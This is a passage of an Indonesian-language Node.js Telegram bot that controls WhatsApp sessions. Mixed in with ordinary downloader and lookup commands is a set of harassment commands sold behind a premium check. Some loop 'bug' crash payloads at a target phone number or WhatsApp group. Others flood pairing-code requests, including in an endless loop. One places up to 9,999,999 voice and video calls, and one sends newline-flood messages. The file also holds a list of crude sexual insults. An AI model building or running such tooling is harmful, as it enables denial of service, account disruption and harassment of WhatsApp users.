              text: "Developer",
              url: "https://t.me/raraa_imuppp",
            },
          ],
        ],
      },
    });
  }

try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

   // caption awal (proses)
    const processCaption = `<pre>${escapeHtml(
`SCARRY SENDING BUG ⚡️
Target : ${formattedNumber}
Type Bug : Invisible Text
Status : Process
Panggilan Bug : @${msg.from.username}

🕊 Scarry Death`
    )}</pre>`;

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://qu.ax/rkgho.jpg",
      {
        caption: processCaption,
        parse_mode: "HTML",
      }
    );

let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

    // kirim bug
    for (let i = 0; i < 15; i++) {
      await LocX(jid); 
      await Ati(jid); 
      await DelayBeta(jid);
      await delay2(jid);
      await sleep(10000);
      console.log(
        chalk.red(`[SCARRY] BUG Processing ${count}/30 Loop ke ${formattedNumber}`)
      );
      count++;
    }

console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // caption success
    const successCaption = `<pre>${escapeHtml(
`SCARRY SUCCES BUG✅️
Target : ${formattedNumber}
Type Bug : Invisible Text
Status : Success
Panggilan Bug : @${msg.from.username}

🕊 Scarry Death`
    )}</pre>`;

await bot.editMessageCaption(successCaption, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    });
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/invisgroup(?:\s(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const groupLink = match[1];
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  const randomImage = getRandomImage();

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `🕒 Jeda dulu ya kontol! ${cooldown} detik.`);
  }

  // === CEK STATUS WHATSAPP ===
  if (!whatsappStatus || sessions.size === 0) {
    return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung.\nGunakan /addsender 62xxx terlebih dahulu.");
  }

  // === CEK PREMIUM ===
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    const deniedCaption = `<pre>${escapeHtml(
      "⚠️ Akses Ditolak\nAnda tidak memiliki akses premium untuk menggunakan command ini."
    )}</pre>`;

    return bot.sendPhoto(chatId, randomImage, {
      caption: deniedCaption,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Developer", url: "https://t.me/raraa_imuppp" }],
        ],
      },
    });
  }

  // === CEK LINK ===
  if (!groupLink) {
    return bot.sendMessage(chatId, "❌ Link grup kamu salah!\nContoh: /invisgroup https://chat.whatsapp.com/xxxx");
  }

  if (!/^https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+$/.test(groupLink)) {
    return bot.sendMessage(chatId, "❌ Format link salah!\nContoh: /invisgroup https://chat.whatsapp.com/xxxx");
  }

  const groupCode = groupLink.split("https://chat.whatsapp.com/")[1];

  try {
    // === PROSES JOIN GRUP ===
    const processCaption = `<pre>${escapeHtml(
`SCARRY SENDING BUG ⚡️
Target : ${groupLink}
Type Bug : Invis Group
Status : Process
Panggilan Bug : @${msg.from.username}

🕊 Scarry Death`
    )}</pre>`;

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://qu.ax/rkgho.jpg",
      {
        caption: processCaption,
        parse_mode: "HTML",
      }
    );

    console.log("\x1b[32m[JOINING GROUP]\x1b[0m Trying to join group...");

    const groupInfo = await sock.groupAcceptInvite(groupCode);
    const groupId = groupInfo.id;

    console.log("\x1b[32m[SUCCESS]\x1b[0m Berhasil join group:", groupId);
    await sleep(3000);

    // === KIRIM BUG KE GRUP ===
    for (let i = 0; i < 20; i++) {
      await BugGroup(groupId);
      await sleep(7000);
      console.log(
        chalk.red(`[SCARRY] BUG Processing ${i + 1}/10 Grup ${groupId}`)
      );
    }

    // === HASIL SUKSES ===
    const successCaption = `<pre>${escapeHtml(
`SCARRY SUCCES BUG ✅️
Target : ${groupLink}
Type Bug : Invis Group
Status : Success
Panggilan Bug : @${msg.from.username}

🕊 Scarry Death`
    )}</pre>`;

    await bot.editMessageCaption(successCaption, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🌪️ Group Link", url: groupLink }],
        ],
      },
    });

  } catch (error) {
    console.error("❌ Error saat join atau kirim bug:", error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug ke grup: ${error.message}`);
  }
});

// === Command TikTok ===
bot.onText(/\/tiktok(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;

  try {
    // ambil url dari argumen atau dari reply
    const fromArgs = match[1]?.trim();
    const fromReply = msg.reply_to_message?.text?.trim();
    const url = fromArgs || fromReply;

    if (!url || !url.includes("tiktok.com")) {
      return bot.sendMessage(chatId, "⚠️ URL TikTok tidak valid!\n\nContoh:\n`/tiktok https://www.tiktok.com/...`", {
        parse_mode: "Markdown",
        reply_to_message_id: msg.message_id,
      });
    }

    // request ke API
    const res = await fetch("https://www.tikwm.com/api/", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({ url }),
    });

    const data = await res.json().catch(() => null);

    if (!data || !data.data || !data.data.play) {
      return bot.sendMessage(chatId, "⚠️ Gagal mendapatkan video tanpa watermark.", {
        reply_to_message_id: msg.message_id,
      });
    }

    const videoUrl = data.data.play;
    const caption = "✅ SUKSES DOWNLOAD URL TIKTOK";

    await bot.sendVideo(chatId, videoUrl, {
      caption,
      reply_to_message_id: msg.message_id,
    });
  } catch (err) {
    console.error("TikTok Command Error:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil video. Coba lagi nanti.", {
      reply_to_message_id: msg.message_id,
    });
  }
});
/**
 * Command: /iqc
 * Format: /iqc jam|batre|carrier|pesan
 * Contoh: /iqc 18:00|40|Indosat|hai hai
 */
bot.onText(/^\/iqc(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userInput = match[1]?.trim();

  // Jika user tidak memasukkan input
  if (!userInput) {
    return bot.sendMessage(
      chatId,
      "⚠ Gunakan format:\n`/iqc jam|batre|carrier|pesan`\n\nContoh:\n`/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown", reply_to_message_id: msg.message_id }
    );
  }

  // Pisahkan argumen
  const [time, battery, carrier, ...msgParts] = userInput.split("|");

  // Validasi input
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return bot.sendMessage(
      chatId,
      "⚠ Format salah!\n\nGunakan format:\n`/iqc jam|batre|carrier|pesan`\n\nContoh:\n`/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown", reply_to_message_id: msg.message_id }
    );
  }

  // Pesan pengguna
  const messageText = encodeURIComponent(msgParts.join("|").trim());

  // Buat URL API
  const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${encodeURIComponent(
    battery
  )}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  // Kirim pesan loading
  await bot.sendMessage(chatId, "⏳ Tunggu sebentar...", {
    reply_to_message_id: msg.message_id,
  });

  try {
    // Fetch data dari API
    const res = await fetch(url);
    if (!res.ok) {
      return bot.sendMessage(chatId, "❌ Gagal mengambil data dari API.", {
        reply_to_message_id: msg.message_id,
      });
    }

    // Konversi response ke buffer
    const buffer =
      typeof res.buffer === "function"
        ? await res.buffer()
        : Buffer.from(await res.arrayBuffer());

    // Kirim hasil sebagai foto
    await bot.sendPhoto(chatId, buffer, {
      caption: "✅ Done By @raraa_imuppp",
      parse_mode: "Markdown",
      reply_to_message_id: msg.message_id,
    });
  } catch (err) {
    console.error("IQC Command Error:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menghubungi API.", {
      reply_to_message_id: msg.message_id,
    });
  }
});
// ================== /INFO ==================
bot.onText(/^\/info$/, async (msg) => {
  const chatId = msg.chat.id;
  const replyUser = msg.reply_to_message?.from;

  // Jika user tidak reply pesan
  if (!replyUser) {
    return bot.sendMessage(chatId, "❌ Harap balas pesan untuk melihat info.", {
      reply_to_message_id: msg.message_id,
    });
  }

  const name = `${replyUser.first_name || ""} ${replyUser.last_name || ""}`.trim();
  const username = replyUser.username ? `@${replyUser.username}` : "Tidak ada";

  const infoText =
    `👤 *INFO USER*\n\n` +
    `• Nama: ${name}\n` +
    `• Username: ${username}\n` +
    `• ID: \`${replyUser.id}\``;

  return bot.sendMessage(chatId, infoText, {
    parse_mode: "Markdown",
    reply_to_message_id: msg.message_id,
  });
});

// ================== /PING ==================
bot.onText(/^\/ping$/, async (msg) => {
  const chatId = msg.chat.id;

  const start = Date.now();

  // Kirim pesan loading
  const sentMessage = await bot.sendMessage(chatId, "⏳ Cek ping...", {
    reply_to_message_id: msg.message_id,
  });

  const end = Date.now();
  const speed = end - start;

  // Update pesan menjadi hasil ping
  bot.editMessageText(`🏓 Pong!\n⚡ Speed: *${speed} ms*`, {
    chat_id: chatId,
    message_id: sentMessage.message_id,
    parse_mode: "Markdown",
  });
});
bot.onText(/\/pinterest(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a search query.\n\nExample:\n/pinterest iPhone 17 Pro Max");
    }

    const query = match[1].trim();

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/search/pinterest?q=${encodeURIComponent(query)}`;

        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result || data.result.length === 0) {
            return bot.sendMessage(chatId, "❌ No Pinterest images found for your query.");
        }

        // Ambil gambar pertama dari hasil
        const firstResult = data.result[0];

        await bot.sendPhoto(chatId, firstResult, {
            caption: `📌 Pinterest Result for: *${query}*`,
            parse_mode: "Markdown"
        });
    } catch (err) {
        console.error("Pinterest API Error:", err);
        bot.sendMessage(chatId, "❌ Error fetching Pinterest image. Please try again later.");
    }
});
bot.onText(/\/brat(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;

  // cek input
  if (!match || !match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a text.\n\nExample:\n/brat Hallo All",
      { reply_to_message_id: msg.message_id }
    );
  }

  const text = match[1].trim();

  try {
    const apiUrl = `https://api.nvidiabotz.xyz/imagecreator/bratv?text=${encodeURIComponent(text)}`;

    // kirim hasil gambar langsung
    await bot.sendPhoto(chatId, apiUrl, {
      caption: `🖼️ Brat Image Generated\n\n✏️ Text: *${text}*`,
      parse_mode: "Markdown",
      reply_to_message_id: msg.message_id,
    });
  } catch (err) {
    console.error("Brat API Error:", err);
    bot.sendMessage(
      chatId,
      "❌ Error generating Brat image. Please try again later.",
      { reply_to_message_id: msg.message_id }
    );
  }
});
//SCMD
bot.onText(/\/getcode(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a website URL.\n\nExample:\n/getcode https://example.com");
    }

    const url = match[1].trim();

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/tools/getcode?url=${encodeURIComponent(url)}`;

        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result) {
            return bot.sendMessage(chatId, "❌ Failed to fetch source code. Please check the URL.");
        }

        const code = data.result;

        if (code.length > 4000) {
            // simpan ke file sementara
            const filePath = `sourcecode_${Date.now()}.html`;
            fs.writeFileSync(filePath, code);

            await bot.sendDocument(chatId, filePath, {
                caption: `📄 Full source code from: ${url}`
            });

            fs.unlinkSync(filePath); // hapus file setelah dikirim
        } else {
            await bot.sendMessage(chatId, `📄 Source Code from: ${url}\n\n<code>${code}</code>`, {
                parse_mode: "HTML"
            });
        }
    } catch (err) {
        console.error("GetCode API Error:", err);
        bot.sendMessage(chatId, "❌ Error fetching website source code. Please try again later.");
    }
});

bot.onText(/\/ig(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide an Instagram post/reel URL.\n\nExample:\n/ig https://www.instagram.com/reel/xxxxxx/");
    }

    const url = match[1].trim();

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/download/instagram?url=${encodeURIComponent(url)}`;

        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result) {
            return bot.sendMessage(chatId, "❌ Failed to fetch Instagram media. Please check the URL.");
        }

        // Jika ada video
        if (data.result.video) {
            await bot.sendVideo(chatId, data.result.video, {
                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
            });
        } 
        // Jika hanya gambar
        else if (data.result.image) {
            await bot.sendPhoto(chatId, data.result.image, {
                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
            });
        } 
        else {
            bot.sendMessage(chatId, "❌ Unsupported media type from Instagram.");
        }
    } catch (err) {
        console.error("Instagram API Error:", err);
        bot.sendMessage(chatId, "❌ Error fetching Instagram media. Please try again later.");
    }
});

/**
 * Command: /cekip
 * Format: /cekip <ip_or_domain>
 */
bot.onText(/^\/cekip(?:\s+(\S+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ipOrDomain = match[1];

  if (!ipOrDomain) {
    return bot.sendMessage(chatId, "⚠️ Gunakan:\n/cekip <ip_or_domain>", {
      reply_to_message_id: msg.message_id,
    });
  }

  try {
    const res = await axios.get(
      `http://ip-api.com/json/${ipOrDomain}?fields=66846719`
    );
    const data = res.data;

    if (data.status !== "success") {
      return bot.sendMessage(
        chatId,
        `❌ Tidak dapat menemukan info untuk: ${ipOrDomain}`,
        { reply_to_message_id: msg.message_id }
      );
    }

    const hasil = `
🌍 *Informasi IP/Domain:* \`${ipOrDomain}\`

📌 IP: ${data.query}
🏳️ Negara: ${data.country} (${data.countryCode})
🌆 Kota: ${data.city}
📍 Provinsi: ${data.regionName}
🛰️ ISP: ${data.isp}
⚡ Organisasi: ${data.org}
🔎 AS: ${data.as}
⏱️ Zona Waktu: ${data.timezone}
    `;

    return bot.sendMessage(chatId, hasil, {
      parse_mode: "Markdown",
      reply_to_message_id: msg.message_id,
    });
  } catch (err) {
    console.error("Error cekip:", err.message);
    return bot.sendMessage(chatId, "❌ Terjadi kesalahan saat cek host.", {
      reply_to_message_id: msg.message_id,
    });
  }
});

/**
 * Command: /cekhost
 * Format: /cekhost <domain>
 */
bot.onText(/^\/cekhost(?:\s+(\S+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const domain = match[1];

  if (!domain) {
    return bot.sendMessage(chatId, "⚠️ Gunakan: /cekhost <domain>", {
      reply_to_message_id: msg.message_id,
    });
  }

  dns.lookup(domain, (err, address, family) => {
    if (err) {
      return bot.sendMessage(chatId, `❌ Gagal menemukan host: ${domain}`, {
        reply_to_message_id: msg.message_id,
      });
    }

    dns.resolve(domain, "NS", (errNs, nsRecords) => {
      const ns = errNs ? ["Tidak ditemukan"] : nsRecords;

      const msgText = `
🌐 *Cek Host*
━━━━━━━━━━━━━━
🌍 Domain: ${domain}
🖥️ IP: ${address}
📡 Family: IPv${family}
📚 NS Records: ${ns.join(", ")}
      `;

      return bot.sendMessage(chatId, msgText, {
        parse_mode: "Markdown",
        reply_to_message_id: msg.message_id,
      });
    });
  });
});

/**
 * Command: /iptrack
 * Format: /iptrack <ip>
 */
bot.onText(/^\/iptrack(?:\s+(\S+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const target = match[1];

  if (!target) {
    return bot.sendMessage(chatId, "❗ Contoh: /iptrack 8.8.8.8", {
      parse_mode: "Markdown",
      reply_to_message_id: msg.message_id,
    });
  }

  try {
    const res = await axios.get(
      `http://ip-api.com/json/${target}?fields=status,message,country,regionName,city,isp,org,as,query,lat,lon,timezone`
    );

    if (res.data.status !== "success") {
      return bot.sendMessage(
        chatId,
        `❌ Gagal melacak: ${res.data.message || "Unknown error"}`,
        { reply_to_message_id: msg.message_id }
      );
    }

    const data = res.data;
    const info = `
🌍 *IP Track Result*
━━━━━━━━━━━━━━
🔹 IP/Host: \`${data.query}\`
🏴 Country: ${data.country}
🏙️ Region: ${data.regionName}
🌆 City: ${data.city}
⏰ Timezone: ${data.timezone}

📡 ISP: ${data.isp}
🏢 Org: ${data.org}
🔖 ASN: ${data.as}

📍 Lokasi: [Google Maps](https://www.google.com/maps?q=${data.lat},${data.lon})
    `;

    return bot.sendMessage(chatId, info, {
      parse_mode: "Markdown",
      disable_web_page_preview: false,
      reply_to_message_id: msg.message_id,
    });
  } catch (err) {
    console.error("Error iptrack:", err.message);
    return bot.sendMessage(chatId, "⚠️ Error: Tidak bisa mengambil data.", {
      reply_to_message_id: msg.message_id,
    });
  }
});

// Endpoint API
const LOCALAI_URL = process.env.LOCALAI_URL || "http://localhost:8080/v1/chat/completions";
const OPENAI_URL = "https://api.openai.com/v1/chat/completions"; // contoh tambahan

// ====== COMMAND /ai ======
bot.onText(/^\/ai(?:\s+([\s\S]+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  let input = match[1]?.trim();

  if (!input) {
    return bot.sendMessage(
      chatId,
      "❌ Masukkan teks setelah perintah `/ai`.\n\nContoh:\n" +
        "`/ai local siapa presiden indonesia sekarang?`\n" +
        "`/ai openai jelaskan teori relativitas`",
      { parse_mode: "Markdown", reply_to_message_id: msg.message_id }
    );
  }

  // Pisahkan argumen pertama = API, sisanya = prompt
  const [apiType, ...promptArr] = input.split(" ");
  const prompt = promptArr.join(" ").trim();

  if (!prompt) {
    return bot.sendMessage(chatId, "⚠️ Harap masukkan pertanyaan setelah memilih API.", {
      reply_to_message_id: msg.message_id,
    });
  }

  try {
    let result = "";

    if (apiType.toLowerCase() === "local") {
      // ====== LOCALAI ======
      const res = await axios.post(
        LOCALAI_URL,
        {
          model: "gpt-4",
          messages: [{ role: "user", content: prompt }],
          temperature: 0.7,
          max_tokens: 500,
        },
        { headers: { "Content-Type": "application/json" } }
      );
      result = res.data?.choices?.[0]?.message?.content?.trim() || "❌ Tidak ada jawaban dari LocalAI.";
    } 
    
    else if (apiType.toLowerCase() === "openai") {
      // ====== OPENAI (contoh kalau ada key) ======
      const res = await axios.post(
        OPENAI_URL,
        {
          model: "gpt-3.5-turbo",
          messages: [{ role: "user", content: prompt }],
          temperature: 0.7,
          max_tokens: 500,
        },
        {
          headers: {
            "Content-Type": "application/json",
            Authorization: `Bearer ${process.env.OPENAI_KEY}`, // simpan key di .env
          },
        }
      );
      result = res.data?.choices?.[0]?.message?.content?.trim() || "❌ Tidak ada jawaban dari OpenAI.";
    } 
    
    else {
      return bot.sendMessage(chatId, "⚠️ API tidak dikenali. Gunakan: `local` atau `openai`", {
        parse_mode: "Markdown",
        reply_to_message_id: msg.message_id,
      });
    }

    await bot.sendMessage(chatId, `💬 *AI Response [${apiType}]*:\n\n${result}`, {
      parse_mode: "Markdown",
      disable_web_page_preview: true,
      reply_to_message_id: msg.message_id,
    });

  } catch (err) {
    console.error("❌ Error API:", err.response?.data || err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat memproses permintaan.", {
      reply_to_message_id: msg.message_id,
    });
  }
});
bot.onText(/^\/cekkodam(?: (.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const nama = (match[1] || '').trim();
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (!nama) {
    return bot.sendMessage(chatId, '𝗻𝗮𝗺𝗮𝗻𝘆𝗮 𝗺𝗮𝗻𝗮? ');
  }

  const khodamList = [
    'si ganteng',
    'Mie ayam', 
    'kang rinem', 
    'jelek dekil hytam', 
    'ganteng kalem', 
    'sangean', 
    'cabul', 
    'suka ngocok', 
    'suka bokep indo',
    'suka bokep jepang', 
    'si jelek',
    'anomali bt script',
    'kang hapus sumber',
    'kang ngocok',
    'Anomali maklu',
    'orang gila',
    'anak rajin',
    'anak cerdas',
    'lonte gurun',
    'dugong',
    'macan yatim',
    'buaya darat',
    'kanjut terbang',
    'kuda kayang',
    'janda salto',
    'lonte alas',
    'jembut singa',
    'gajah terbang',
    'kuda cacat',
    'jembut pink',
    'sabun bolong'
  ];

  const pickRandom = (list) => list[Math.floor(Math.random() * list.length)];

  const hasil = `

\`\`\`<b>𝗵𝗮𝘀𝗶𝗹 𝗰𝗲𝗸 𝗸𝗵𝗼𝗱𝗮𝗺 :</b></blockquote>
 ◇ 𝗻𝗮𝗺𝗮 : ${nama}
 ◇ 𝗸𝗵𝗼𝗱𝗮𝗺𝗻𝘆𝗮 : ${pickRandom(khodamList)}
  `;

  bot.sendMessage(chatId, hasil, { parse_mode: 'HTML' });
});


bot.onText(/\/tourl/i, async (msg) => {
    const chatId = msg.chat.id;
    
    
    if (!msg.reply_to_message || (!msg.reply_to_message.document && !msg.reply_to_message.photo && !msg.reply_to_message.video)) {
        return bot.sendMessage(chatId, "❌ Silakan reply sebuah file/foto/video dengan command /tourl");
    }

    const repliedMsg = msg.reply_to_message;
    let fileId, fileName;

    
    if (repliedMsg.document) {
        fileId = repliedMsg.document.file_id;
        fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
    } else if (repliedMsg.photo) {
        fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id;
        fileName = `photo_${Date.now()}.jpg`;
    } else if (repliedMsg.video) {
        fileId = repliedMsg.video.file_id;
        fileName = `video_${Date.now()}.mp4`;
    }

    try {
        
        const processingMsg = await bot.sendMessage(chatId, "⏳ Mengupload ke Catbox...");

        
        const fileLink = await bot.getFileLink(fileId);
        const response = await axios.get(fileLink, { responseType: 'stream' });

        
        const form = new FormData();
        form.append('reqtype', 'fileupload');
        form.append('fileToUpload', response.data, {
            filename: fileName,
            contentType: response.headers['content-type']
        });

        const { data: catboxUrl } = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: form.getHeaders()
        });

        
        await bot.editMessageText(` Upload berhasil!\n📎 URL: ${catboxUrl}`, {
            chat_id: chatId,
            message_id: processingMsg.message_id
        });

    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, "❌ Gagal mengupload file ke Catbox");
    }
});

bot.onText(/\/SpamPairing (\d+)\s*(\d+)?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Kamu tidak punya izin untuk menjalankan perintah ini."
    );
  }

  const target = match[1];
  const count = parseInt(match[2]) || 999999;

  bot.sendMessage(
    chatId,
    `Mengirim Spam Pairing ${count} ke nomor ${target}...`
  );

  try {
    const { state } = await useMultiFileAuthState("K4ezarIXpairing");
    const { version } = await fetchLatestBaileysVersion();

    const sucked = await makeWAsocket({
      printQRInTerminal: false,
      mobile: false,
      auth: state,
      version,
      logger: pino({ level: "fatal" }),
      browser: ["Mac Os", "chrome", "121.0.6167.159"],
    });

    for (let i = 0; i < count; i++) {
      await sleep(1600);
      try {
        await sucked.requestPairingCode(target);
      } catch (e) {
        console.error(`Gagal spam pairing ke ${target}:`, e);
      }
    }

    bot.sendMessage(chatId, `Selesai spam pairing ke ${target}.`);
  } catch (err) {
    console.error("Error:", err);
    bot.sendMessage(chatId, "Terjadi error saat menjalankan spam pairing.");
  }
});

bot.onText(/\/SpamCall(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  // Check if the command is used in the allowed group

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }
    
if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "🚫 Missing input. Please provide a target number. Example: /overload 62×××."
    );
  }

  const numberTarget = match[1].replace(/[^0-9]/g, "").replace(/^\+/, "");
  if (!/^\d+$/.test(numberTarget)) {
    return bot.sendMessage(
      chatId,
      "🚫 Invalid input. Example: /overload 62×××."
    );
  }

  const formatedNumber = numberTarget + "@s.whatsapp.net";

  await bot.sendPhoto(chatId, "https://files.catbox.moe/8z7a5h.jpg", {
    caption: `┏━━━━━━〣 𝙽𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 〣━━━━━━┓
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /spamcall
┃〢 Wᴀʀɴɪɴɢ : ᴜɴʟɪᴍɪᴛᴇᴅ ᴄᴀʟʟ
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`,
  });

  for (let i = 0; i < 9999999; i++) {
    await sendOfferCall(formatedNumber);
    await sendOfferVideoCall(formatedNumber);
    await new Promise((r) => setTimeout(r, 1000));
  }
});


bot.onText(/^\/hapusbug\s+(.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const q = match[1]; // Ambil argumen setelah /delete-bug
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to view the premium list."
    );
  }

    if (!q) {
        return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\n/fixedbug 62xxx`);
    }
    
    let pepec = q.replace(/[^0-9]/g, "");
    if (pepec.startsWith('0')) {
        return bot.sendMessage(chatId, `Contoh : /fixedbug 62xxx`);
    }
    
    let target = pepec + '@s.whatsapp.net';
    
    try {
        for (let i = 0; i < 3; i++) {
            await sock.sendMessage(target, { 
                text: "SCARRY DEATH 𝐁𝐔𝐆\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSCARRY DEATH"
            });
        }
        bot.sendMessage(chatId, "Done Clear Bug By Raraa😜");l
    } catch (err) {
        console.error("Error:", err);
        bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
    }
});

bot.onText(/\/SpamReportWhatsapp (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (!isOwner(fromId)) {
    return bot.sendMessage(
      chatId,
      "❌ Kamu tidak punya izin untuk menjalankan perintah ini."
    );
  }

  const q = match[1];
  if (!q) {
    return bot.sendMessage(
      chatId,
      "❌ Mohon masukkan nomor yang ingin di-*report*.\nContoh: /spamreport 628xxxxxx"
    );
  }

  const target = q.replace(/[^0-9]/g, "").trim();
  const pepec = `${target}@s.whatsapp.net`;

  try {
    const { state } = await useMultiFileAuthState("K4ezarIXreport");
    const { version } = await fetchLatestBaileysVersion();

    const sucked = await makeWAsocket({
      printQRInTerminal: false,
      mobile: false,
      auth: state,
      version,
      logger: pino({ level: "fatal" }),
      browser: ["Mac OS", "Chrome", "121.0.6167.159"],
    });

    await bot.sendMessage(chatId, `Telah Mereport Target ${pepec}`);

    while (true) {
      await sleep(1500);
      await sucked.requestPairingCode(target);
    }
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `done spam report ke nomor ${pepec} ,,tidak work all nomor ya!!`);
  }
});

let groupOnly = false; // default OFF

// Middleware: lock semua command jika groupOnly aktif
bot.on("message", (msg) => {
  if (groupOnly && msg.chat.type === "private") {
    bot.sendMessage(
      msg.chat.id,
      "⚠️ Bot ini hanya bisa digunakan di *Group* karena mode GroupOnly sedang aktif.",
      { parse_mode: "Markdown" }
    );
    return; // stop di sini, command apapun tidak dijalankan
  }
});

// Command untuk toggle groupOnly
bot.onText(/\/grouponly(?:\s(on|off))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // hanya owner yang boleh
  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
